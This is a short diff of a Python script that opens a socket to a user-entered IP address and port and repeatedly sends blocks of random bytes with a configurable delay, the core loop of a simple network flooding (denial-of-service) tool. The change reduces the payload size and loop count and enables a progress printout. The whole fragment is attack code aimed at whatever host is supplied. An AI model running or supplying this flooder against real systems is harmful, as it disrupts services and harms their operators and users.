@@ -8,8 +8,8 @@ sleep = float(input("Sleep: "))
 
 s.connect((ip, port))
 
-for i in range(1, 100**1000000):
-    s.send(random._urandom(10)*1000000)
-    #print(f"Send: {i}", end='\r')
+for i in range(1, 100**1000):
+    s.send(random._urandom(10)*1000)
+    print(f"Send: {i}", end='\r')
     time.sleep(sleep)
     
